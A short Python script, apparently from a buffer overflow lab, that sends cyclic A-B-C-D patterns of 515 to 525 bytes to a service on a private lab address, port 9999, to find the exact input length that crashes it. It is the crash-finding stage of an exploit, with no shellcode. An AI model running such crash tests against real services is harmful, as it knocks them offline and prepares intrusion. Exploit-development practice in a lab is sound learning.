import socket
import time

def create_pattern(size):
    pattern = ''
    for i in range(size):
        pattern += chr(65 + (i % 4))  # Cycles through A, B, C, D
    return pattern

def test_precise_buffer(size):
    buffer = create_pattern(size)  # Create buffer before connection attempt
    
    try:
        print(f"\nTesting size: {size}")
        target_ip = "192.168.56.101"
        target_port = 9999
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, target_port))
        
        # Receive banner
        s.recv(1024)
        
        payload = buffer + "\n"
        print(f"Sending {len(buffer)} bytes...")
        s.send(payload.encode())
        
        time.sleep(1)
        try:
            response = s.recv(1024)
            print("Response received")
        except:
            print("No response - possible crash")
        
        s.close()
        return False
        
    except ConnectionRefusedError:
        print(f"Crash confirmed at size: {size}")
        return True
    except Exception as e:
        print(f"Error occurred: {e}")
        return True

# Start testing
start_size = 515  # Starting just before where we saw issues
end_size = 525    # End just after
step = 1          # Test one byte at a time

print("Starting buffer overflow test...")
print("Press Ctrl+C to stop at any time")

for size in range(start_size, end_size + 1):
    crashed = test_precise_buffer(size)
    if crashed:
        print(f"\nFinal crash point identified at: {size} bytes")
        break
    time.sleep(3)  # Wait between tests to allow service to recover
